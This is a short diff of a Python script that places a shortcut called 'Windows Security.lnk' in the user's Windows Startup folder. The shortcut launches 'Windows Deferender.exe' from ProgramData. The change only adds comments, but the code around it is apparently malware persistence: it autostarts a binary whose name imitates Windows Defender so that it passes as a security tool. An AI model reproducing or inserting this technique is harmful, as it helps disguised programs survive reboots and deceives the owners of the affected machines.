@@ -3,8 +3,9 @@ from win32com.client import Dispatch
 
 path = os.path.join(f"C:\\Users\\{os.getenv('UserName')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows Security.lnk")
 #C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+#make ink in startup
 print(path)
-target = r"C:\\ProgramData\\Windows Deferender\\Windows Deferender.exe"
+target = r"C:\\ProgramData\\Windows Deferender\\Windows Deferender.exe"#this is just example path
 wDir = r"C:\\ProgramData\\Windows Deferender"
 icon = r"C:\\ProgramData\\Windows Deferender\\Windows Deferender.exe"
 shell = Dispatch('WScript.Shell')
